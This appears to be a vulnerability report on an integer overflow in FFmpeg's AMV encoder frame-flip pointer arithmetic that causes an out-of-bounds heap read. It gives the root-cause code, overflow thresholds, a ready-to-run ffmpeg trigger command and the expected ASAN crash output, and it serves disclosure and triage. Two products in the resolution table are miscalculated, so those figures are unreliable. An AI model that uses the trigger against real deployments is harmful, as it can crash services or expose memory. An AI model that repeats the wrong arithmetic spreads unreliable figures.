# VULN-001: AMV Encoder Integer Overflow in Frame Flip Pointer Arithmetic

## Vulnerability

- **File**: `libavcodec/mjpegenc.c`
- **Function**: `amv_encode_picture()`
- **Lines**: 636–638
- **Type**: CWE-190 (Integer Overflow) → CWE-823 (OOB Heap Read)

## Root Cause

```c
#define V_MAX 2
for (i = 0; i < 3; i++) {
    int vsample = i ? 2 >> chroma_v_shift : 2;
    pic->data[i] += pic->linesize[i] * (vsample * s->c.height / V_MAX - 1);
    pic->linesize[i] *= -1;
}
```

The AMV encoder flips frames vertically by adjusting `pic->data[i]` to point at the last row,
then negating `pic->linesize[i]`. The pointer adjustment is computed as:

- **Luma (i=0)**: `vsample=2`, `V_MAX=2` → factor = `2 * height / 2 - 1 = height - 1`
  - Expression: `pic->linesize[0] * (height - 1)`
- Both `pic->linesize[0]` and `(height - 1)` are `int` (32-bit signed)
- For large resolutions the product exceeds `INT_MAX` (2,147,483,647) → **signed integer overflow (UB)**
- The wrapped negative value is added to `pic->data[0]`, causing the pointer to point
  several GB **before** the frame buffer
- Subsequent pixel reads by the JPEG encoding engine trigger an **OOB heap read**

## Overflow Threshold

```
linesize[0] * (height - 1) > INT_MAX
```

For a square frame: `width² > INT_MAX` → `width > 46,340` → minimum multiple-of-16: **46,352**

| Resolution    | Product                 | Overflows? | Memory needed |
|---------------|-------------------------|------------|---------------|
| 46336 × 46336 | 46336 × 46335 = 2,146,826,560 | No   | —             |
| 46352 × 46352 | 46352 × 46351 = **2,148,296,752** | **Yes** | ~3.2 GB |
| 65488 × 32800 | 65488 × 32799 = **2,147,940,912** | **Yes** | ~3.2 GB |

## Constraints

- AMV encoder max dimension: **65,500** (checked in `mjpeg_encode_init`)
- AMV requires dimensions to be **multiples of 16** (strict compliance check on height)
- AMV only accepts **YUVJ420P** pixel format

## PoC Approach

The PoC uses FFmpeg's built-in `lavfi` (libavfilter) `color` source to synthesize a large
video frame without needing an external file. Three attempts are made:

1. `46352×46352` via `color` lavfi source — minimum square overflow resolution
2. `65488×32800` via `color` lavfi source — wide/short asymmetric overflow  
3. Scale small MKV to `46352×46352` — alternate input path

**Trigger command**:
```bash
ffmpeg -f lavfi -i "color=size=46352x46352:rate=1" \
       -vframes 1 -pix_fmt yuvj420p -c:v amv output.amv
```

## Expected ASAN Output

On a system with sufficient memory (~4+ GB free):

```
==XXXXX==ERROR: AddressSanitizer: heap-buffer-overflow
READ of size N at 0xXXXXXXXX
    #0 ... in encode_block  libavcodec/mjpegenc.c:...
    #1 ... in amv_encode_picture  libavcodec/mjpegenc.c:640
    ...
0xXXXXXXXX is located -XXXXXXXX bytes to the left of XXXXXXXX-byte region
```

The pointer subtracted by ~2.1 GB (the wrapped negative value) will land in unmapped
or unrelated heap memory, causing a segfault or ASAN detection.

## Memory Constraint Note

The overflow requires allocating a ~3.2 GB YUV420P frame. On systems with insufficient
RAM, FFmpeg will fail with `ENOMEM` before reaching the vulnerable code. In that case,
the vulnerability is confirmed by code analysis but not reproducible in the current
environment.
